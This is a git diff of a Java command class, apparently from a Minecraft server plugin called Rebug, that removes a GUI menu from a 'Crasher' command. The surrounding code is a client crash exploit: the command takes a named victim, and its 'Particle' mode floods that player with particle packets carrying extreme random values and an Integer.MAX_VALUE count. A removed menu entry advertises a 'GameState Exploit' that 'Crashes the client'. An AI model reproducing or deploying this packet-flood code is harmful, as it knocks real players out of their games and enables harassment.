@@ -2,15 +2,8 @@ package me.killstorm103.Rebug.Commands;
 
 import java.util.ArrayList;
 
-import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
-import org.bukkit.Material;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
-import org.bukkit.inventory.Inventory;
-import org.bukkit.inventory.ItemStack;
-import org.bukkit.inventory.meta.ItemMeta;
-
 import io.netty.buffer.Unpooled;
 import me.killstorm103.Rebug.Main.Command;
 import me.killstorm103.Rebug.Utils.PT;
@@ -26,7 +19,7 @@ public class Crasher extends Command
 
 	@Override
 	public String getSyntax() {
-		return "crash <Crash Exploit or 'menu'> <Crash Victim> ...";
+		return "crash <Crash Exploit> <Crash Victim> ...";
 	}
 
 	@Override
@@ -37,7 +30,6 @@ public class Crasher extends Command
 	public String getPermission() {
 		return StartOfPermission() + "crasher";
 	}
-	private ArrayList<String> lore = new ArrayList<>();
 	@Override
 	public void onCommand(CommandSender sender, String[] args) throws Exception 
 	{
@@ -51,27 +43,6 @@ public class Crasher extends Command
 		if (mode == null || mode.length() < 1)
 		{
 			Log(sender, getSyntax());
-			return;
-		}
-		if (mode.equalsIgnoreCase("menu") && sender instanceof Player)
-		{
-			Player player = (Player) sender;
-			lore.clear();
-			
-			// Size can be: 9, 18, 27, 36, 45, 54
-			Inventory inventory = Bukkit.createInventory(player, 9, ChatColor.DARK_RED + "Crashers");
-			
-			inventory.clear();
-			ItemStack item = new ItemStack(Material.CLAY);
-			ItemMeta meta = item.getItemMeta();
-			meta.setDisplayName(ChatColor.RED + "GameState");
-			lore.add("GameState Exploit!");
-			lore.add("Crashes the client");
-			meta.setLore(lore);
-			item.setItemMeta(meta);
-			inventory.setItem(0, item);
-			
-			player.openInventory(inventory);
 			return;
 		}
 		Packet<?> packet = null;
@@ -107,6 +78,7 @@ public class Crasher extends Command
 		if (mode.equalsIgnoreCase("Particle"))
 		{
 			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
+			
             for (int i = 0; i < EnumParticle.values().length; i ++)
             {
             	packet = new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0});
